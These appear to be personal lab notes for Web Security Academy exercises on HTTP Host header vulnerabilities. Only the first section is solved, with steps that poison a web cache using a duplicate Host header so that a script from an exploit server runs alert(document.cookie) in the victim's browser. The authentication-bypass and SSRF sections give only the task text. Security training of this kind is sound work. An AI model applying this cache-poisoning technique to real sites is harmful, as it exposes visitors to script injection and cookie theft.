## HTTP Host Header vulnerabilities
### Web cache poisoning via ambiguous requests
```bash

# This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

# To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Add an additional Host: header below the current Host: header
Like so:

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: test.com

Send
Copy "test.com"
Ensure the response includes:

X-Cache: hit

Enter into the search box:

test.com

Find:

<script type="text/javascript" src="//test.com/resources/js/tracking.js"></script>

Go to: "Go to exploit server"
File:

/resources/js/tracking.js

Body:

alert(document.cookie)

Go to: Repeater
Change:

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: test.com

To

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: exploit-0a4400bd04f32f3ec0790e1c01b9001f.web-security-academy.net

Send
Ensure the response includes:

X-Cache: hit

### Host header authentication bypass
```bash

# This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

# To solve the lab, access the admin panel and delete Carlos's account.

### Routing-based SSRF
```bash

# This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

# To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.
